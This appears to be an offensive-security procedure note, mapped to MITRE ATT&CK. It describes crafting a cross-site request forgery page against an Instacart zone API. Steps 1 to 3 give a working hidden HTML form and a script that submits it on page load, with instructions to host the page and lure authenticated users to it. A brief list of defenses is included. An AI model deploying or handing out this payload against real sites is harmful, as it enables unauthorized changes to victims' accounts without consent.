---
id: proc-uuid-2
tags:
  - csrf
  - html
  - exploitation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:50.204Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-CSRF-HTML-Form

## Summary

This procedure creates a malicious HTML page with a hidden form that auto-submits to the Instacart zone API, forging a POST request to change the victim's zone when they visit the page while authenticated.

## Description

CSRF exploits rely on tricking users into submitting requests from a malicious context. The HTML form mimics the legitimate POST to /api/v2/zones, using hidden inputs for 'zip' and 'override=true'. JavaScript ensures automatic submission on load, bypassing user interaction. Hosted on an attacker-controlled site, this alters delivery preferences without consent, potentially denying service in certain areas.

## Requirements

1. Text editor to write HTML/JavaScript
2. Web server to host the malicious page (e.g., GitHub Pages or local server)
3. Knowledge of vulnerable endpoint and parameters

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens and validate them server-side
- Set SameSite=Lax/Strict on session cookies
- Educate users on phishing links and verify site authenticity

## Objectives

1. Generate HTML payload that forges zone update request
2. Ensure auto-submission for seamless exploitation
3. Test payload in a safe environment to confirm functionality

## Instructions

### Step 1: Write HTML Form

**Context**: Create the basic form structure targeting the endpoint.

Use this HTML template:

```html
<form id="csrf-form" action="https://admin.instacart.com/api/v2/zones" method="POST">
  <input type="hidden" name="zip" value="10001">
  <input type="hidden" name="override" value="true">
</form>
```

**Expected Output**: Valid HTML form ready for submission.

### Step 2: Add Auto-Submission Script

**Context**: Use JavaScript to submit the form immediately on page load.

Append this script:

```html
<script>document.getElementById('csrf-form').submit();</script>
```

> Place the full HTML in a .html file and open in browser to test (use a test account).

**Expected Output**: Form submits automatically, sending POST request.

### Step 3: Host and Verify

**Context**: Deploy the page and confirm it triggers the API call.

Upload to a web host and visit while authenticated to Instacart. Check zone settings post-visit.

**Expected Output**: Zone changed to specified zip.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[html]]
- [[exploitation]]
